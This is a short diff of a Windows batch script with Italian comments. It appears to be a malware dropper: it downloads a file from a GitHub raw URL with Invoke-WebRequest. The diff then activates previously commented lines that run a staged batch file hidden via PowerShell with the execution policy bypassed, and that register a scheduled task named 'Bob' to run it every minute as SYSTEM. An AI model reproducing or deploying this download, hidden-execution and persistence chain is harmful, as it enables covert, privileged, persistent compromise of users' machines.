@@ -26,7 +26,7 @@ Invoke-WebRequest -Uri "https://github.com/Ax0my10rk/A/raw/refs/heads/main/libss
 
 timeout /t 2 >nul
 :: Esegui wait_R.bat in modo nascosto
-::powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ^
-::Start-Process -WindowStyle Hidden -FilePath 'C:\Users\%USERNAME%\Project\Roll\Staging\waitR.bat'
-::schtasks /create /tn "Bob" /tr "C:\Users\%USERNAME%\Project\Roll\Staging\wait_R.bat" /sc minute /mo 1 /ru SYSTEM
+powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ^
+Start-Process -WindowStyle Hidden -FilePath 'C:\Users\%USERNAME%\Project\Roll\Staging\waitR.bat'
+schtasks /create /tn "Bob" /tr "C:\Users\%USERNAME%\Project\Roll\Staging\waitR.bat" /sc minute /mo 1 /ru SYSTEM
 
